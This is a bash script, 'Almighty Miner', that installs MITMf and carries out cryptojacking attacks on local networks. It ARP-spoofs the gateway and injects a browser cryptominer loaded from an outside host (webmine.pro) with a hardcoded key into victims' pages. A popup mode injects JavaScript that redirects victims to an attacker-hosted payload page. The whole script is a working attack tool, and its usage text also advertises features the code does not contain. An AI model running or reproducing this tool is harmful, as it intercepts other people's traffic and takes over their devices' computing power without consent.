if [[ $1 == "--install" ]]; then
	apt-get update -y
	apt-get install mitmf -y
	pip install Twisted==15.5.0
	echo "FINISHED INSTALLING!"
	exit
fi

if [[ $1 == "--generate" ]]; then
	echo "<script src="//webmine.pro/lib/crlt.js"></script>
	<script>
	  var miner = new CRLT.Anonymous('ab113566d4312b090c54e9189e823898efed45a6bcc3');
		miner.start(CRLT.FORCE_MULTI_TAB);
	</script>" > ./payload.html
	echo
	echo "PLAYLOAD GENERATED! "
	echo "NOTE: Don't forget to run 'service apache2 start'"
	echo "Put payload.html in your root web server dir"
	exit
fi

if [ $# -eq "3" ]; then
	echo "Running miner in the middle injection attack..."
	echo "<script src="//webmine.pro/lib/crlt.js"></script>
	<script>
	  var miner = new CRLT.Anonymous('ab113566d4312b090c54e9189e823898efed45a6bcc3');
		miner.start(CRLT.FORCE_MULTI_TAB);
	</script>" > /root/.almighty.html
	mitmf --inject --html-file /root/.almighty.html --spoof --arp --gateway $2 -i $3
	rm /root/.almighty.html
fi

if [[ $1 == "-p" && $# -eq '4' ]]; then
	echo "Running almighty popup miner in the middle attack..."
	PU='function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
        results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function dpu(){document.removeEventListener("click",pu);}function pu(){if(getParameterByName("pu")==1){return;}dpu();var params = ["height="+screen.height,"width="+screen.width,"fullscreen=yes","menubar=yes","resizable=yes","scrollbars=yes","status=yes","titlebar=yes","toolbar=yes"].join(",");if(document.location.href.includes("?")){window.open(document.location+"&pu=1", "_blank", params).moveTo(0,0);}else{window.open(document.location+"?pu=1", "_blank", params).moveTo(0,0);}window.location="http://'$4'/payload.html"}document.addEventListener("click",pu);'
	echo $PU > /root/.almighty_popup.js
	mitmf --dns --inject --js-file /root/.almighty_popup.js --spoof --arp --gateway $2 -i $3

	rm /root/.almighty_popup.html
else
	echo
	echo "Almighty Miner"
	echo "Automatic & instant mining (360mine)."
	echo "GUI + Custom settings + Merged mining + Multiple pools and more!"
	echo
	echo "To install dependencies run:"
	echo "	./almighty.sh --install"
	echo
	echo "To launch a standard miner injection attack run:"
	echo "	./almighty.sh <crypto-loot api key> <gateway ip> <interface name>"
	echo
	echo "----To launch a popup miner attack----"
	echo
	echo "	First run:"
	echo "		./almighty.sh --generate <crypto-loot api key>"
	echo
	echo "and place payload.html into your web server root directory"
	echo
	echo "	Second run:"
	echo "		./almighty.sh -p <gateway ip> <interface name> <web server ip>"
	echo
	echo
fi
